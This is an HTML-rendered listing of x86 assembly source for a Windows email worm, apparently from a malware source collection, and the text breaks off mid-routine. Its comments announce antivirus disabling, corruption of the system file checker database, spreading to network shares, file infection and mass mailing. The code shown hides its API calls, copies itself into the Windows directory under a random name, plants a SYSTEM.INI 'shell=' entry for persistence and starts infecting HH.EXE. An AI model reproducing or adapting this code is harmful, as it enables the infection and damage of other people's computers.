<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Toil - source.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;try to disable some av's and corrupt Default.sfc database</span><span class="sc0">
</span><span class="sc1">;copy itself to remote windir &amp; share root dir</span><span class="sc0">
</span><span class="sc1">;infect filez via tmapi</span><span class="sc0">
</span><span class="sc1">;send email via icq white pages (x-wav bug)</span><span class="sc0">
</span><span class="sc1">;text to screen, message box, special effects</span><span class="sc0">

            </span><span class="sc5">P586</span><span class="sc0">
            </span><span class="sc5">model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;DBG EQU X      ;  IFDEF, shows activity via OutputDebugString()</span><span class="sc0">
            </span><span class="sc5">SEH</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">     </span><span class="sc1">;  IFDEF, apply Structure Exception Handle</span><span class="sc0">

            </span><span class="sc9">include</span><span class="sc0">        </span><span class="sc5">bl.inc</span><span class="sc0">

            </span><span class="sc5">DATASEG</span><span class="sc0">

            </span><span class="sc5">KeywordArray</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">

            </span><span class="sc9">include</span><span class="sc0">        </span><span class="sc5">kw.inc</span><span class="sc0">       </span><span class="sc1">;  phrase array</span><span class="sc0">

            </span><span class="sc5">MyMutex</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'BinLadenfucksBush'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc5">ivct</span><span class="sc0">           </span><span class="sc5">INVICTUS</span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">TMAPI</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">MemAlloc</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">TheVxName</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">Geral</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">ProcessID</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">MutexHandle</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">B64File</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">LangID</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">DLLPath</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">saved_esp</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

            </span><span class="sc5">CODESEG</span><span class="sc0">

</span><span class="sc5">Binladen</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc5">dbgad545</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0"> </span><span class="sc5">ad545</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'STARTING W32.BINLADEN'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">functionlst</span><span class="sc0">

            </span><span class="sc9">include</span><span class="sc0">        </span><span class="sc5">api.inc</span><span class="sc0">

</span><span class="sc5">functionlst</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">function_list_number</span><span class="sc0">

</span><span class="sc5">get_dll</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;  DLL name</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">hide_function</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;  DLL handle</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;  Number of api to retrieve</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;  Api Name</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;  Where to store api address</span><span class="sc0">

</span><span class="sc5">get_api</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">hide_function</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">get_api</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">get_dll</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MyMutex</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenMutexA</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">EndOfWar</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MyMutex</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateMutexA</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">MutexHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc0">
            </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">rnd_dword</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0f0f00h</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'AAA\'
</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@rname</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">OpenRead</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">OverSYSINI</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sysini</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenRead</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">OverSYSINI</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ivct._file_size</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
            </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">Closesys</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">FoundBin</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'lleh'</span><span class="sc0">  </span><span class="sc1">;  shell=Explorer.exe XXX.exe</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">BinFound</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">FoundBin</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Closesys</span><span class="sc0">

</span><span class="sc5">BinFound</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">17</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Closesys</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'FHC'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'FUCK'</span><span class="sc0">

</span><span class="sc5">Closesys</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sysini</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">

</span><span class="sc5">OverSYSINI</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@rname</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@iid</span><span class="sc0">

</span><span class="sc5">@@spname</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@KeyName</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'shell'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@KeyName</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@SectionName</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'boot'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@SectionName</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">systemini</span><span class="sc0">
</span><span class="sc5">sysini</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SYSTEM.INI'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">systemini</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">explorerstring</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Explorer.exe '</span><span class="sc0">
</span><span class="sc5">@@rname</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">explorerstring</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">WritePrivateProfileStringA</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@iid</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetCurrentProcessId</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">ProcessID</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetUserDefaultLangID</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">LangID</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TheVxName</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
</span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">OutputDebugStringA</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DLLPath</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@@1</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\INVICTUS.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@@1</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DLLPath</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc1">;  Is this an automatic execution or not ?</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TheVxName</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Auto</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'FHC'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'FUCK'</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Auto</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TheVxName</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Auto</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@spname</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Auto</span><span class="sc0">

</span><span class="sc5">@@auto</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ProgError</span><span class="sc0">

</span><span class="sc5">Auto</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@name_h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'HH.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@name_h</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenRead</span><span class="sc0">

</span><span class="sc5">@@test</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@name__</span><span class="sc0">
</span><span class="sc5">@@test_</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ivct._file_size</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">101</span><span class="sc0">
            </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">UseIT</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;  100% play</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TheVxName</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">
